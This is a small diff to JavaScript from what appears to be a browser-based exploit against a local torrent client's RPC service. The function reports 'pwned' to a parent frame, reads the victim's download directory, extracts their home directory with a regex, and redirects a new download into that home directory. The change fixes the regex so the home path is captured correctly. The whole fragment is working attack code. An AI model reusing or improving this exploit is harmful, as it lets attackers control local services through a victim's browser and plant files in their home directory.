@@ -47,8 +47,8 @@ function sendRpc() {
 			window.parent.postMessage({status: "pwned", response: xhr.responseText }, "*");
 		} else {
 			var downloadDir = JSON.parse(xhr.responseText).arguments["download-dir"];
-			var regex = /^(\/home\/[^\/]+\/).*$/g
-			var homeDir = regex.exec(downloadDir)[0];
+			var regex = /^(\/home\/[^\/]+)(\/.*)?\/?$/g
+			var homeDir = regex.exec(downloadDir)[1];
 			console.log("Got homeDir as: ", homeDir);
 			startDownload.arguments["download-dir"] = homeDir;
 			command = JSON.stringify(startDownload);
